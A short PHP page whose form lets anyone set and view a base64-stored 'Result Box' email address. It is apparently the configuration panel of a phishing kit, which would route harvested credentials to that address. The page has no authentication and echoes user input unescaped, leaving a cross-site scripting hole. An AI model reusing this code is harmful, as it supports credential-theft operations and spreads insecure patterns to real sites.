<?php

$email_list = file("2.txt");
$to = base64_decode(implode($email_list));
$file = "2.txt";
if (isset($_POST['test'])) {
file_put_contents($file, base64_encode($_POST["test"]));
};


?>

<label>Result Box: <b><?php echo $to; ?></b></label><br><br>
<form action="" method="post">
<label>Input New Result Box:</label><br>
<input id="test" name="test" placeholder="email@example.com"/>
<input type="submit" value="submit">
<br><br>
<label>New Result Box:<b> <?php if(empty($_POST["test"])){
	$to = "";
}

else{
	$to = $_POST["test"];
}

echo $to ?></label></b><br>
<label>You can refresh this page to be sure...</label>
</form>